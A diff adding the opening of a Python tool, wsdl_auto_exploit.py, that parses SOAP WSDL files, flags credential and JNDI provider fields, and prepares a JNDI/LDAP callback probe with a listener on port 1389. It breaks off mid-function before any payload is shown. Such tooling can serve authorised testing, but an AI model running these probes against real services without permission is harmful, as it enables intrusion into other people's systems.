@@ -1,0 +1,105 @@
+new file mode 100644
+
+
+
+@@ -0,0 +1,334 @@
++#!/usr/bin/env python3
++"""
++wsdl_auto_exploit.py
++
++Safe automation for WSDL reconnaissance + JNDI probe (LDAP callback probe).
++- Dry-run by default (parses WSDL, enumerates ops, writes payload XML files named after service).
++- Active probe only with --exploit and explicit confirmation phrase (default: "I HAVE AUTHORIZATION").
++- Will optionally start a TCP listener on chosen IP:port and report if a connection occurs.
++- Will check sudo ufw status (if available) to help you validate egress/ingress rules.
++
++Requirements:
++  pip install zeep requests lxml
++
++Usage examples (dry-run only):
++  python wsdl_auto_exploit.py --wsdl https://host/service?wsdl --outdir ./payloads
++
++To perform active probes:
++  python wsdl_auto_exploit.py --wsdl ... --outdir ./payloads --exploit --listener --listen-port 1389
++
++CAUTION: Active probing must only be used with explicit authorization.
++"""
++
++import argparse
++import os
++import socket
++import subprocess
++import threading
++import time
++from http import client
++from pathlib import Path
++from typing import Dict, List
++
++import requests
++from zeep import Client, Settings
++from zeep.plugins import HistoryPlugin
++from zeep.transports import Transport
++
++# ---- Config / Suspicious items to look for ----
++SUSPICIOUS_OP_KEYWORDS = ("set", "create", "update", "configure", "init", "start", "stop")
++SUSPICIOUS_FIELD_KEYWORDS = [
++    "password", "passwd", "credential", "secret", "token", "key", "username", "user", "admin",
++    "provider_url", "providerurl", "initial_context_factory", "security_credentials",
++    "security_principal", "PROVIDER_URL", "SECURITY_CREDENTIALS", "SECURITY_PRINCIPAL",
++    "connectionfactory", "connection_factory", "destinationname", "customprocessor", "customreader",
++    "customwriter", "msgSource"
++]
++
++# ---- Utility functions ----
++def get_local_ip() -> str:
++    """Return the primary local IP address used to reach the internet (best-effort)."""
++    try:
++        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
++        # connect to a public DNS IP, doesn't send packets
++        s.connect(("8.8.8.8", 80))
++        ip = s.getsockname()[0]
++        s.close()
++        return ip
++    except Exception:
++        return "127.0.0.1"
++
++def check_ufw_status() -> str:
++    """Try to run 'sudo ufw status' to show firewall settings (requires sudo)."""
++    try:
++        p = subprocess.run(["sudo", "ufw", "status"], capture_output=True, text=True, timeout=10)
++        return p.stdout.strip() if p.returncode == 0 else f"ufw returned code {p.returncode}: {p.stdout.strip()} {p.stderr.strip()}"
++    except Exception as e:
++        return f"ufw check failed: {e}"
++
++def save_payload(filename: Path, xml: str):
++    filename.parent.mkdir(parents=True, exist_ok=True)
++    filename.write_text(xml, encoding="utf-8")
++    print(f"[+] Wrote payload: {filename}")
++
++# ---- Zeep client loader with simple timeout handling ----
++def load_wsdl(wsdl_url: str, timeout=15, verify=True):
++    session = requests.Session()
++    session.verify = verify
++    transport = Transport(session=session, timeout=timeout)
++    settings = Settings(strict=False, xml_huge_tree=True)
++    history = HistoryPlugin()
++    client = Client(wsdl=wsdl_url, transport=transport, settings=settings, plugins=[history])
++    return client, history
++
++# ---- Recon & payload generation ----
++def recon_wsdl(wsdl_url: str):
++    """Parse WSDL and return a dict with services, ports, operations, suspicious fields."""
++    client, history = load_wsdl(wsdl_url)
++    services = {}
++    suspicious_fields = set()
++    encoded_style = False
++
++    # gather services/ports/operations and detect encoded style usage in raw WSDL if possible
++    try:
++        raw = requests.get(wsdl_url, timeout=10, verify=wsdl_url.startswith("https")).text
++        if "http://schemas.xmlsoap.org/soap/encoding/" in raw:
++            encoded_style = True
++    except Exception:
++        raw = None
++
++    for sname, ser
